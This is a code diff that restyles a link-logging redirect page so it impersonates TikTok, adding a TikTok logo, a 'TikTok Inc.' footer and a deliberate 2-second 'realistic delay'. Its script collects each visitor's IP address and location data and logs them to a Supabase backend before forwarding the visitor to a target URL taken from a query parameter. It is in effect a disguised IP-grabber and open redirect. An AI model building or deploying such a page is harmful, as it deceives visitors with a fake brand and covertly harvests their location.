@@ -3,49 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>TikTok | Redirecting...</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="supabase_config.js"></script>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f4f4f9;
+            background-color: #121212; /* TikTok Dark Mode */
             margin: 0;
-            color: #333;
+            color: white;
         }
+
+        .tiktok-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            filter: drop-shadow(2px 0px 0px #fe2c55) drop-shadow(-2px 0px 0px #25f4ee);
+        }
+
         .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
+            width: 48px;
+            height: 48px;
+            border: 3px solid #FFF;
+            border-bottom-color: #fe2c55;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 2s linear infinite;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
             margin-bottom: 20px;
         }
-        @keyframes spin {
+
+        @keyframes rotation {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .container {
-            text-align: center;
+
+        .message {
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            opacity: 0.8;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 30px;
+            font-size: 12px;
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="loader"></div>
-        <p>Loading project assets...</p>
-    </div>
+    
+    <!-- Using a generic TikTok-style SVG logo -->
+    <svg class="tiktok-logo" viewBox="0 0 448 512" fill="white">
+        <path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
+    </svg>
+
+    <span class="loader"></span>
+    <p class="message">Redirecting to TikTok...</p>
+
+    <div class="footer">TikTok Inc. 2024</div>
 
     <script>
         async function logAndRedirect() {
             const urlParams = new URLSearchParams(window.location.search);
-            const target = urlParams.get('target') || 'https://google.com';
-            const linkName = urlParams.get('name') || 'Unnamed Link';
+            const target = urlParams.get('target') || 'https://www.tiktok.com';
+            const linkName = urlParams.get('name') || 'TikTok Redirect';
 
             try {
                 // 1. Get IP and Location Data
@@ -71,8 +100,10 @@
             } catch (err) {
                 console.error('Logging failed:', err);
             } finally {
-                // 3. Always redirect, even if logging fails
-                window.location.href = target;
+                // 3. Realistic delay (2 seconds) before final redirect
+                setTimeout(() => {
+                    window.location.href = target;
+                }, 2000);
             }
         }
 
